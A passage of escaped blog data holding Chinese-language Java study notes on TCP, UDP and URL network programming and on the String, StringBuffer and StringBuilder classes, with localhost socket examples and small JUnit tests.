传输完毕，需**释放已建立的连接，效率低**\n\n**UDP协议:**\n\n- 将数据、源、目的封装成数据包，**不需要建立连接**\n- 每个数据报的大小限制在64K内\n- 发送不管对方是否准备好，接收方收到也不确认，故是不可靠的\n- 可以广播发送\n- 发送数据结束时**无需释放资源，开销小，速度快**\n\n\n\n![三次握手](http://image.xpshuai.cn/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.jpg)\n\n\n\n![四次挥手](http://image.xpshuai.cn/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.jpg)\n\n\n\n\n\n\n\n### TCP网络编程\n\n实例1：客户端发送信息给服务端，服务端将信息显示在控制台上\n\n```java\n  //客户端\n    @Test\n    public void client(){\n        InetAddress inet = null;\n        Socket socket = null;\n        OutputStream os = null;\n        try {\n            //1.创建socket对象\n            inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip\n            socket = new Socket(inet, 8899);\n\n            //2.获取输出流，用于输出数据\n            os = socket.getOutputStream();\n            //3.写出数据的操作\n            os.write(\"你好，我是客户端mm\".getBytes());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }finally {\n            //4.关闭\n                try {\n                    if(os != null){\n                    os.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                try {\n                    if(socket != null){\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n        }\n    }\n\n\n\n    //服务端\n    @Test\n    public void server(){\n        ServerSocket ss = null;\n        Socket socket = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try{\n            //1.创建服务器端的ServerSocket，指明自己的端口号\n            ss = new ServerSocket(8899);\n            //2.调用accept()表示接收来自于客户端的socket\n            socket = ss.accept();\n            //3.获取输入流\n            is = socket.getInputStream();\n\n//            不建议这么写：容易出现乱码\n//            byte[] buffer = new byte[20];\n//            int len;\n//            while ((len = is.read(buffer)) != -1){\n//                String str = new String(buffer,0, len);\n//                System.out.println(str);\n//            }\n            //4.读取输入流中的数据\n            //用ByteArrayOutputStream的形式来输出\n            baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[5];\n            int len;\n            while ((len = is.read(buffer)) != -1){\n                baos.write(buffer,0,len);  //写到内置的数组中了\n            }\n            System.out.println(baos.toString()); //把内部的数组输出成string\n\n            System.out.println(\"收到来自客户端ip：\" + socket.getInetAddress().getHostAddress() + \"个数据\");\n        }catch (Exception e){\n            e.printStackTrace();\n        }finally {\n            //5.关闭\n            try {\n                if(baos != null){\n                    baos.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            try {\n                if(is != null){\n                    is.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            try {\n                if(socket != null){\n                    socket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            try {\n                if(ss != null){\n                    ss.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n```\n\n\n\n实例2：客户端发送文件给服务端，服务端将文件保存在本地。\n\n```java\n//客户端2\n@Test\npublic void client2(){\n    InetAddress inet = null;\n    Socket socket = null;\n    OutputStream os = null;\n    FileInputStream fis = null;\n    try {\n        //1.创建socket对象\n        inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip\n        socket = new Socket(inet, 8899);\n\n        //2.获取流\n        os = socket.getOutputStream();\n        fis = new FileInputStream(new File(\"d:\\\\io\\\\1.png\"));\n        //3.写出数据的操作\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = fis.read(buffer)) != -1){\n            os.write(buffer,0,len);\n        }\n\n    } catch (Exception e) {\n        e.printStackTrace();\n    }finally {\n        //4.关闭\n        try {\n            if(fis != null){\n                fis.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(os != null){\n                os.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(socket != null){\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n\n}\n\n//服务端2\n@Test\npublic void server2(){\n    ServerSocket ss = null;\n    Socket socket = null;\n    InputStream is = null;\n    FileOutputStream fos = null;\n    try{\n        //1.创建服务器端的ServerSocket，指明自己的端口号\n        ss = new ServerSocket(8899);\n        //2.调用accept()表示接收来自于客户端的socket\n        socket = ss.accept();\n        //3.获取输入流\n        is = socket.getInputStream();\n        fos = new FileOutputStream(new File(\"d:\\\\io\\\\1_out.png\"));\n\n        //3.写出数据的操作\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = is.read(buffer)) != -1){\n            fos.write(buffer,0,len); //写入文件数据到本地\n        }\n\n        System.out.println(\"收到来自客户端ip：\" + socket.getInetAddress().getHostAddress() + \"个数据\");\n    }catch (Exception e){\n        e.printStackTrace();\n    }finally {\n        //5.关闭\n        try {\n            if(fos != null){\n                fos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(is != null){\n                is.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(socket != null){\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(ss != null){\n                ss.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n\n\n```\n\n\n\n实例3：从客户端发送文件给服务端，服务端保存到本地。并返回“发送成功”给客户端。并关闭相应的连接。\n\n```java\n//客户端3\n@Test\npublic void client3(){\n    InetAddress inet = null;\n    Socket socket = null;\n    OutputStream os = null;\n    FileInputStream fis = null;\n    InputStream is = null;\n    ByteArrayOutputStream baos = null;\n    try {\n        //1.创建socket对象\n        inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip\n        socket = new Socket(inet, 8899);\n\n        //2.获取流\n        os = socket.getOutputStream();\n        fis = new FileInputStream(new File(\"d:\\\\io\\\\1.png\"));\n        //3.写出数据的操作\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = fis.read(buffer)) != -1){\n            os.write(buffer,0,len);\n        }\n\n        //客户端关闭数据的输出\n        socket.shutdownOutput();\n\n        //5.接收来自服务端的消息，并显示到终端\n        is = socket.getInputStream();\n        baos = new ByteArrayOutputStream();\n        byte[] buffer2 = new byte[5];\n        int len2;\n        while ((len2 = is.read(buffer2)) != -1){\n            baos.write(buffer2,0,len2);  //写到内置的数组中了\n        }\n        System.out.println(baos.toString()); //把内部的数组输出成string\n\n\n\n    } catch (Exception e) {\n        e.printStackTrace();\n    }finally {\n        //6.关闭\n        try {\n            if(fis != null){\n                fis.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(os != null){\n                os.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(is != null){\n                is.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(socket != null){\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(baos != null){\n                baos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n\n    }\n\n}\n\n//服务端3\n@Test\npublic void server3(){\n    ServerSocket ss = null;\n    Socket socket = null;\n    InputStream is = null;\n    FileOutputStream fos = null;\n    OutputStream os = null;\n    try{\n        //1.创建服务器端的ServerSocket，指明自己的端口号\n        ss = new ServerSocket(8899);\n        //2.调用accept()表示接收来自于客户端的socket\n        socket = ss.accept();\n        //3.获取输入流\n        is = socket.getInputStream();\n        fos = new FileOutputStream(new File(\"d:\\\\io\\\\1_out.png\"));\n\n        //3.写出数据的操作\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = is.read(buffer)) != -1){\n            fos.write(buffer,0,len); //写入文件数据到本地\n        }\n        System.out.println(\"图片传输完成!\");\n\n        System.out.println(\"收到来自客户端ip：\" + socket.getInetAddress().getHostAddress() + \"个数据\");\n\n        //4.给客户端反馈\n        os = socket.getOutputStream();\n        os.write(\"你好，照片已收到\".getBytes());\n\n    }catch (Exception e){\n        e.printStackTrace();\n    }finally {\n        //5.关闭\n        try {\n            if(fos != null){\n                fos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(os != null){\n                os.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(is != null){\n                is.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(socket != null){\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(ss != null){\n                ss.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n\n\n```\n\n\n\n\n\n### UDP网络编程\n\n- 类`DatagramSocket`和 `DatagramPacket`实现了基于UDP 协议网络程序。\n- UDP数据报通过数据报套接字DatagramSocket发送和接收，**系统不保证UDP数据报一定能够安全送到目的地，也不能确定什么时候可以抵达**。\n- DatagramPacket对象封装了UDP数据报，在数据报中包含了发送端的IP地址和端口号以及接收端的IP地址和端口号。\n- UDP协议中每个数据报都给出了完整的地址信息，因此无须建立发送方和接收方的连接。如同发快递包裹一样。\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-31 11:54\n * @功能：UDP网络编程\n *\n *\n * 例子：\n *\n */\npublic class UDPTest {\n    //发送端\n    @Test\n    public void send() throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n\n        String str = \"我是UDP数据包的大导弹\";\n        byte[] data = str.getBytes();\n        InetAddress inet = InetAddress.getLocalHost();\n        DatagramPacket packet = new DatagramPacket(data,0,data.length,inet, 9090);\n\n        socket.send(packet);\n\n        socket.close();\n    }\n    \n\n    //接收端\n    @Test\n    public void receive() throws IOException{\n        DatagramSocket socket = new DatagramSocket(9090); //指定端口号\n\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer,0,buffer.length);\n        socket.receive(packet);\n\n        System.out.println(new String(packet.getData(), 0, packet.getLength()));\n    \n        socket.close();\n    }\n}\n\n```\n\n\n\n\n\n\n\n### URL编程\n\n#### 概述\n\n- **URL(Uniform Resource Locator)**: 统一资源定位符，它表示Internet上**某一资源**的地址。\n- 它是一种具体的UR，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。\n- 通过URL我们可以访问Internet上的各种网络资源，比如最常见的 www，ftp站点。浏览器通过解析给定的URL可以在网络上查找相应的文件或其他资源。\n- **URL的基本结构由5部分组成:**\n  `<传输协议>:<主机名>:<端口号>/<文件名>#片段名?参数列表`\n  - 例如:\n    http://192.168.1.100:8080/helloworld/index.jsp#a?username=shkstart&password=123>\n  - 片段名: 即**锚点**，例如看小说，直接定位到章节\n  - 参数列表格式: `参数名=参数值&参数名=参数值....`\n\n\n\n\n\n#### URL类构造器\n\n![url类构造器](http://image.xpshuai.cn/java-url%E7%B1%BB%E6%9E%84%E9%80%A0%E5%99%A8.jpg)\n\n\n\n#### URL类的方法\n\n一个URL对象生成后，其属性是不能被改变的，但可以通过它给定的方法来获取这些属性:\n\n```java\npublic string getProtocol()\t//获取该URL的协议名\npublic String getHost( )\t//获取该URL的主机名\npublic String getPort( )\t//获取该URL的端口号\npublic String getPath( )\t//获取该URL的文件路径\npublic String getfile( )\t//获取该URL的文件名\npublic String getQuery( )\t//获取该URL的查询名\n\n```\n\n```java\ntry{\n    URL url = new URL(\"http://www.xpshuai.cn/posts/29903/#toc-heading-8\");\n    System.out.println(url.getProtocol());\n    System.out.println(url.getHost());\n    System.out.println(url.getPort());\n    System.out.println(url.getPath());\n    System.out.println(url.getFile());\n    System.out.println(url.getQuery());\n\n}catch (Exception e){\n    e.printStackTrace();\n}\n```\n\n\n\n\n\n**例子：**实现服务端数据下载\n\n```java\n//实现服务端数据下载\n@Test\npublic void urlTest2() {\n    HttpURLConnection urlConnection = null;\n    InputStream is = null;\n    FileOutputStream fos = null;\n    try{\n        URL url = new URL(\"http://www.xpshuai.cn/medias/featureimages/15.jpg\");\n\n        urlConnection = (HttpURLConnection) url.openConnection();\n        //真正的去获取\n        urlConnection.connect();\n\n        is = urlConnection.getInputStream(); //获取到输入流\n        fos = new FileOutputStream(\"d:\\\\io\\\\pic.jpg\");\n\n        byte[] buffer = new byte[1024];\n        int len;\n        while ((len = is.read(buffer)) != -1){\n            fos.write(buffer, 0, len);\n        }\n    }catch (Exception e){\n        e.printStackTrace();\n    }finally {\n        try {\n            if(is != null){\n                is.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        try {\n            if(fos != null){\n                fos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        if (urlConnection != null) {\n            urlConnection.disconnect();\n        }\n    }\n\n\n\n\n}\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["网络编程"],"categories":["Java学习"]},{"title":"Java学习之常用类","url":"%2Fposts%2F1952%2F","content":"\n### String类\n\n#### 基础知识\n\n**String类: 代表字符串**。Java程序中的所有字符串字面值（如\"abc\"）都作为此类的实例实现。\n\nString是一个final类，代表<font color=red>不可变的字符序列</font>。\n\n字符串是常量，用双引号引起来表示。它们的值在创建之后不能更改。\n\nString对象的字符内容是存储在一个字符数组value[]中的。\n\n\n\n**字符串常量池：**\n\n三种JVM：\n\n- Sun公司的HotSpot（使用的较多）\n- BEA公司的JRockit\n- IBM公司的J9 VM\n\n\n\n**Heap 堆**\n\n—个JVM实例只存在一个堆内存，堆内存的大小是可以调节的。类加载器读取了类文件后，需要把类、方法、常变量放到堆内存中，保存所有引用类型的真实信息，以方便执行器执行，堆内存分为三部分︰\n\n```bash\nYoung Generation Space新生区\t\tYoung\nTenure generation space养老区\t\told\nPermanent Space永久存储区\t\t   Perm\n\n```\n\n\n\n**事实上永久区是划分在方法区的：**\n\n![JVM优化是哪里](http://image.xpshuai.cn/JVM%E4%BC%98%E5%8C%96%E6%98%AF%E5%93%AA%E9%87%8C.png)\n\n![代](http://image.xpshuai.cn/%E4%BB%A3.png)\n\n\n\n\n\n**永久区：**\n\n​    永久存储区是一个常驻内存区域，用于存放JDK自身所携带的Class,Interface 的元数据，也就是说它存储的是运行环境必须的类信息，**被装载进此区域的数据是不会被垃圾回收器回收掉的，关闭JVM才会释放此区域所占用的内存。**\n​    如果出现`java.lang.OutOfMemoryError: PermGen space`，说明是Java虚拟机对永久代Perm内存设置不够。一般出现这种情况，都是程序启动需要加载大量的第三方jar包。例如:在一个Tomcat下部署了太多的应用。或者大量动态反射生成的类不断被加载，最终导致Perm区被占满。\nJdk1.6及之前:常量池分配在永久代, Jdk1.6在方法区\n\nJdk1.7:有，但已经逐步“去永久代”，1.7在堆\n\nJdk1.8及之后:无，1.8在元空间\n\n![在不用jdk中区别](http://image.xpshuai.cn/jdk%E6%B0%B8%E4%B9%85%E5%8C%BA.png)\n\n\n\n\n\n\n\n**String对象的创建：**\n\n```java\nstring str = \"hello\";\n\n//本质上this.value = new char[0];\nString s1 = new String();\n\n//this.value = original.value;\nString s2 = new string(String origina1);\n\n//this.value = Arrays.copyof(value，value.length);\nstring s3 = new String(char[] a);\n\nString s4 = new String(char[]a,int startIndex,int count);\n\n```\n\n\n\n**两种创建方式的区别：**\n\n![两种创建方式的区别](http://image.xpshuai.cn/string%E4%B8%A4%E7%A7%8D%E5%88%9B%E5%BB%BA%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB.jpg)\n\n\n\n**字符串的特性：**\n\n\n\n![字符串的特性](http://image.xpshuai.cn/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%89%B9%E6%80%A7.png)\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 10:44\n * @功能：String的使用\n *\n*/\n\npublic class StringTest {\n/**\n * 1.String声明为final，不可被继承\n * 2.String实现了Serializable接口：表示字符串是支持序列化的\n *          实现了Comparable接口：表示可以比较大小\n * 3.String内部定义了final char[] value用于存储字符数据\n * 4.String代表不可变的字符序列\n *   体现：\n *       1.当对字符串重新赋值时，需要重写指定内存区域赋值，不能使用原有的value进行赋值。\n         2.当对现有的字符串进行连接操作时，也需要重新指定内存区域赋值，不能使用原有的地址的value进行赋值\n *       3.当调用replace()修改字符串或字符时，也需要重新指定内存区域赋值，不能使用原有的地址的value进行赋值\n *5.通过字面量方式(区别于new)给一个字符串赋值，此时的字符串值声明在字符串常量池中,字符串常量池中是不会存储相同内容的字符串的\n*/\n    @Test\n    public void test1(){\n        String s1 = \"asd\";  //字面量\n        String s2 = \"asd\";\n        System.out.println(s1 == s2); //不是基本数据类型，比较s1和s2的地址池  true\n\n        s1 = \"hello\";\n\n        System.out.println(s1 == s2); //比较s1和s2的地址池   false\n        System.out.println(s1);\n        System.out.println(s2);\n\n        String s3 = \"asd\";\n        s3 += \"fgh\";\n        System.out.println(s3); // 拼接了，还得新造一个，不能直接在原来地址上添加\n        System.out.println(s2);\n\n        String s4 = \"asd\";\n        String s5 = s4.replace('a', '6'); //也是新造，不能在原地址区进行任何修改\n        System.out.println(s4);\n        System.out.println(s5);\n\n\n\n    }\n\n    /**\n     * String的实例化方式：\n     方式1：通过字面量定义的方式\n     方式2：通过 new + 构造器的方式\n\n\n      面试题: string s = new String(\"abc\");方式创建对象，在内存中创建了几个对象?\n             答：两个，一个是堆空间中new的，另一个是char[]对象的常量池中的数据\"abc\"\n\n     */\n    @Test\n    public void test2(){\n        //此时的s1和s2的数据是声明在方法区中的字符串常量池中\n        String s1 = \"java\";\n        String s2 = \"java\";\n        //通过 new + 构造器的方式：:此时的s3和s4保存的地址值，是数据在堆空间中开辟空间以后对应的地址值。\n        String s3 = new String(\"java\");\n        String s4 = new String(\"java\");\n\n        System.out.println(s1 == s2); //true\n        System.out.println(s1 == s3); //false\n        System.out.println(s3 == s4);  //false\n\n        // String中equals()比较的是值，==比较的是地址\n        // 通过字面量定义的str会存储在字符串常量池中\n\n\n    }\n\n\n    /**\n     * 结论：1.常量与常量的拼接结果在常量池。且常量池中不会存在相同内容的常量\n     *      2.只要其中有一个是变量，结果就在堆中\n     *      3.如果拼接的结果调用intern()方法，返回值就在常量池中\n     */\n    @Test\n    public void test3() {\n        //此时的s1和s2的数据是声明在方法区中的字符串常量池中\n        String s1 = \"java\";\n        String s2 = \"EE\";\n\n        String s3 = \"javaEE\";  //字面量\n        String s4 = \"java\" + \"EE\";  //字面量的连接，在常量池中\n        String s5 = s1 = \"EE\";  //只要有变量名参与，就不在常量池而在堆空间中了\n        String s6 = \"java\" + s2;\n        String s7 = s1 + s2;\n\n        System.out.println(s3 == s4); // true\n        System.out.println(s3 == s5); // false\n        System.out.println(s3 == s6);// false\n        System.out.println(s3 == s7);// false\n        System.out.println(s5 == s6);// false\n        System.out.println(s5 == s7);// false\n        System.out.println(s6 == s7);// false\n\n//        intern()\n        String s8 = s5.intern(); //返回值得到的s8使用的常量池中已经存在的\"javaEE\"\n        System.out.println(s3 == s8); // true\n\n    }\n\n\n}\n\n```\n\n\n\n#### 练习\n\n**练习1：**\n\n![分析](http://image.xpshuai.cn/string%E7%BB%83%E4%B9%A01.jpg)\n\n**面试题2：**\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 14:38\n * @功能：面试题一道， 涉及String与值传递机制\n */\npublic class CaseTest {\n    String str = new String(\"good\");\n    char[] cs = {'t', 'e', 's', 't'};\n    public void change(String str, char ch[]){\n        // 这里形参是String，是引用型数据，但是String是不可变的，这里形参相当于造了一个变量\n        // 但是是无法改变String的，所以还是good\n        str = \"test ok\";\n        ch[0] = 'b';\n\n        // ch是数组，是引用型数据，是在堆里的，可以修改，t-->b\n    }\n\n    public static void main(String[] args) {\n        CaseTest ex = new CaseTest();\n        ex.change(ex.str, ex.cs);\n        System.out.println(ex.str);  // good\n        System.out.println(ex.cs); // best\n    }\n}\n\n```\n\n\n\n\n\n\n\n\n\n#### String常用方法\n\n![String常用方法](http://image.xpshuai.cn/String%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95.jpg)\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 14:51\n * @功能：String常用方法\n */\npublic class StringMethodTest {\n    @Test\n    public void tes1(){\n        String s0 = \"我是大帅锅\";\n        String s1 = \"    Hello World  \";\n        String s2 = \"I am A boy.\";\n        System.out.println(s1.length());  //长度\n        System.out.println(s1.charAt(0));  //取索引上的一个值\n        System.out.println(s1.isEmpty());  //是否为空\n\n        String s11 = s1.toLowerCase();\n        System.out.println(s11); //小写的字符串\n        System.out.println(s1); //s1还不变，仍然为原来的\n        System.out.println(s1.toUpperCase()); //转换大写\n\n        String s3 = s1.trim();\n        System.out.println(s3);  //去除首尾空格（注册用户写输入框的时候）\n        System.out.println(s1.equalsIgnoreCase(s11)); //忽略大小写的情况下比较值是否相等\n        System.out.println(s1.equals(s2));\n\n        System.out.println(s1.concat(\"EFG\")); //拼接\n\n        //涉及到字符串排序\n        System.out.println(s1.compareTo(s1)); //比较字符串大小(逐个比较ASCII码)，相等为0，负数表示前面的数小\n\n        System.out.println(s0.substring(1)); // 从索引位置开始截取\n        System.out.println(s0.substring(1, 3)); // 从索引位置开始截取到end索引位置(左闭右开)\n\n    }\n\n    @Test\n    public void tes2() {\n        String s0 = \"我是大帅锅\";\n        String s1 = \"Hellor World\";\n        String s2 = \"I am A boy.\";\n        String s3 = \"am A boy\";\n\n        boolean b1 = s1.endsWith(\"ld\");\n        System.out.println(b1);\n        boolean b2 = s1.startsWith(\"H\"); //是否以指定字符开始\n        System.out.println(b2);\n\n        boolean b3 = s1.startsWith(\"ll\", 2); //从索引位置开始，是否以指定字符开始\n        System.out.println(b3);\n\n        System.out.println(s2.contains(s3)); //是否包含s3, true\n\n        //返回指定子串在字符串中第一次出现位置的索引(如果没找到，返回-1)\n        System.out.println(s1.indexOf(\"ll\"));\n        System.out.println(s1.indexOf(\"ll\", 2)); //从指定索引开始找子串(想找子串出现了几次，找到一次之后从上一次找到的索引+子串长度继续往后找)\n\n        //从后往前找\n        System.out.println(s1.lastIndexOf(\"or\"));\n        System.out.println(s1.lastIndexOf(\"or\", 6)); //从指定索引反向搜索\n\n        // 什么时候indexOf和lastIndexOf返回索引相同？\n        // 1.存在唯一的str\n        // 2.不存在这个str\n\n\n    }\n\n    @Test\n    public void tes3() {\n        String s0 = \"我1是大帅锅\";\n        String s1 = \"Hellor World\";\n        String s2 = \"I am A boy.\";\n        String s3 = \"am A boy\";\n\n        //替换\n        String s11 = s1.replace(\"or\", \"XX\"); //替换字符串(所有出现的都要替换)\n        String s111 = s1.replace('W', '时'); //替换单个字符\n        System.out.println(s11);\n        System.out.println(s111);\n\n        String str = \"12hello34world5java798mysql465\";\n        String strr = s1.replaceAll(\"\\\\d+\", \",\");  //根据正则替换\n        System.out.println(strr);\n//        s0.replaceFirst() //只替换第一次\n\n        //匹配正则表达式  boolean\n        System.out.println(str.matches(\"\\\\d+\"));\n\n\n        //切片 根据正则\n        String[] s00 = s0.split(\"\\\\d+\");\n        for (int i = 0; i <s00.length ; i++) {\n            System.out.println(s00[i]);\n        }\n    }\n}\n\n```\n\n\n\n#### String与其他类型转换\n\n##### 1.String与基本数据类型、包装类之间的转换\n\n![string与其他类型转换](http://image.xpshuai.cn/string%E4%B8%8E%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.jpg)\n\n```java\n/**\n* 1.String与基本数据类型、包装类之间的转换\n* String -->基本数据类型、包装类:调用包装类的静态方法：parseXXX(str)\n*\n*基本数据类型、包装类 -->String：调用String重载的valueOf(xxx)\n*\n*\n*/\n@Test\npublic void test1(){\n    String s1 = \"123\";   //在常量池里\n    int n = Integer.parseInt(s1);\n\n    String s2 = String.valueOf(n);\n    String s3 = n + \"\";  //在堆里\n\n}\n```\n\n\n\n##### 2.String与char[]之间的转换\n\n```java\n    /**\n     * 2.String与char[]之间转换\n     *String -->char[]:调用String的toCharArray()\n     *char[] --> String: 调用String的构造器\n     *\n     */\n    @Test\n    public void test2(){\n        String s1 = \"abc123\";   //在常量池里\n        char[] c1 = s1.toCharArray(); //\n        for (int i = 0; i < c1.length; i++) {\n            System.out.println(c1[i]);\n        }\n\n        char[] arr = new char[]{'h','e','l','l','o'};\n        String s2 = new String(arr);\n        System.out.println(s2);\n```\n\n\n\n##### 3.String与字节数组byte[]之间的转换\n\n![String与字节数组byte[]之间的转换](http://image.xpshuai.cn/String%E4%B8%8E%E5%AD%97%E8%8A%82%E6%95%B0%E7%BB%84byte%5B%5D%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2.png)\n\n```java\n    /**\n     * 3.String与字节数组byte[]之间的转换\n     * 编码：String --> byte[]:调用String的getBytes()\n     *\n     * 解码：byte[] --> String: 调用String的构造器\n     *\n     *\n     */\n    @Test\n    public void test3() throws UnsupportedEncodingException {\n        String s1 = \"qwe123中国\";\n        byte[] bytes = s1.getBytes(); //转换为字节，中文采用的就是默认的字符编码集（汉字在utf-8占3个字节）\n        System.out.println(Arrays.toString(bytes)); //这么遍历输出也可以\n\n        byte[] gbks = s1.getBytes(\"gbk\"); //使用指定的字符集进行编码（汉字在gnk占2个字节）\n        System.out.println(Arrays.toString(gbks)); //这么遍历输出也可以\n\n        String s2 = new String(bytes);\n//        String s2 = new String(gbks);  //如果不用前面相同的字符集解码，会乱码\n        System.out.println(s2);\n\n\n    }\n    \n    \n```\n\n\n\n一个加了final的拼接问题：\n\n```java\n@Test\npublic void test4(){\n    String s1 = \"javaEE\";\n    String s2 = \"java\";\n    String s3 = s2 + \"EE\";\n    System.out.println(s1 == s3); //false\n\n    final String s4 = \"java\";   //加了final，就是 s4:常量\n    String s5 = s4 + \"EE\";\n    System.out.println(s1 == s5); // true\n}\n\n```\n\n\n\n\n\n#### 常见算法题\n\n![string常见算法题.](http://image.xpshuai.cn/string%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98.jpg)\n\n\n\n\n\n#### StringBuffer与StringBuilder\n\n三者区别：\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 16:22\n * @功能：StringBuffer与StringBuilder\n */\npublic class StringBufferTest {\n    /**\n     *\n     * String、StringBuffer、StringBuilder有何异同？\n     * String: 不可变的字符序列：底层使用char[]存储\n     * StringBuffer：可变的字符序列：线程安全的，效率偏低：底层使用char[]存储\n     * StringBuilder：可变的字符序列：线程不安全，效率高一些，jdk5.0新增：底层使用char[]存储\n     *\n     *\n     *\n     * 为啥第一个不可变，后俩可变呢？\n     *\n     *\n     * 【源码分析：】\n     * String s = new String(); //new char[0];\n     * String s1 = new String(\"abc\"); // char value = new char[]{'a','b','c'};\n     *\n     * StringBuffer sb1 = new StringBuffer(); // char value = new char[16]; 底层创建了一个长度16的数组\n     * System.out.println(sb1);  //长度为：0\n     * sb1.append('a'); //value[0] = 'a';\n     *sb1.append('b'); //value[1] = 'b';\n     *\n     * StringBuffer sb2 = new StringBuffer(\"aba\"); // char value = new char[\"aba\".length() + 16]\n     *\n     * 问题1：\n     * System.out.println(sb2.length());  // 3\n     *\n     * 问题2：\n     * 扩容问题：如果要添加的数据底层数组盛不下了，那就扩容底层的数组\n     *          默认情况下，扩容为原来容量的2倍，同时将原有数组中的元素复制到新的数组中\n     *\n     *          因为String不可变，所以优先用StringBuffer和StringBuilder，再考虑有无多线程问题...\n     *\n     *\n     *\n     *\n     *\n     *\n     *\n     *\n     */\n\n    @Test\n    public void test1(){\n        StringBuffer sb1 = new StringBuffer(\"aba\");\n        sb1.setCharAt(0, 'm');\n        System.out.println(sb1);\n    }\n\n\n}\n\n```\n\n\n\n##### StringBuffer中常用方法\n\n![StringBuffer中常用方法](http://image.xpshuai.cn/StringBuffer%E4%B8%AD%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95.jpg)\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 16:22\n * @功能：StringBuffer与StringBuilder\n */\npublic class StringBufferTest {\n    /**\n     *\n     * String、StringBuffer、StringBuilder有何异同？\n     * String: 不可变的字符序列：底层使用char[]存储\n     * StringBuffer：可变的字符序列：线程安全的，效率偏低：底层使用char[]存储\n     * StringBuilder：可变的字符序列：线程不安全，效率高一些，jdk5.0新增：底层使用char[]存储\n     *\n     *\n     *\n     * 为啥第一个不可变，后俩可变呢？\n     *\n     *\n     * 【源码分析：】\n     * String s = new String(); //new char[0];\n     * String s1 = new String(\"abc\"); // char value = new char[]{'a','b','c'};\n     *\n     * StringBuffer sb1 = new StringBuffer(); // char value = new char[16]; 底层创建了一个长度16的数组\n     * System.out.println(sb1);  //长度为：0\n     * sb1.append('a'); //value[0] = 'a';\n     *sb1.append('b'); //value[1] = 'b';\n     *\n     * StringBuffer sb2 = new StringBuffer(\"aba\"); // char value = new char[\"aba\".length() + 16]\n     *\n     * 问题1：\n     * System.out.println(sb2.length());  // 3\n     *\n     * 问题2：\n     * 扩容问题：如果要添加的数据底层数组盛不下了，那就扩容底层的数组\n     *          默认情况下，扩容为原来容量的2倍，同时将原有数组中的元素复制到新的数组中\n     *\n     *          